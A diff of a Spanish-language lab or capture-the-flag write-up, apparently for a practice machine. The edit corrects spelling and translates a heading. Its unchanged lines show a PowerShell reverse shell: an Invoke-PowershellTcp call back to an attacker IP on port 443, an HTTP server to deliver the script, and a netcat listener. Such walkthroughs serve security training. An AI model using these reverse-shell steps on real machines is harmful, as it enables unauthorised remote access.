@@ -1,4 +1,4 @@
-## Vuln exploit & Gaining Access {-}
+## Explotacion de vulnerabilidad & Ganando Acceso {-}
 
 ### Entablar una reverse shell de typo Powershell {-}
 
@@ -17,7 +17,7 @@ En el fichero PS.ps1, añadimos el invoke del script al final del fichero
 Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.8 -Port 443
 ```
 
-Esto nos permitte lanzar el Script directamente despues de descargamiento del fichero en la maquina victima
+Esto nos permite lanzar el Script directamente despues de descargamiento del fichero en la maquina victima
 
 
 ### Enviamos y ejecutamos la reverse shell {-}
@@ -28,7 +28,7 @@ Esto nos permitte lanzar el Script directamente despues de descargamiento del fi
     python3 -m http.server 80
     ```
 
-1. En la maquina de attackante en una nueva shell
+1. En la maquina de atacante en una nueva shell
 
     ```bash
     rlwrap nc -nlvp 443
@@ -42,7 +42,7 @@ Esto nos permitte lanzar el Script directamente despues de descargamiento del fi
 
 Ya estamos a dentro.
 
-### Analizamos el systema {-}
+### Analizamos el sistema {-}
 
 ```bash
 whoami
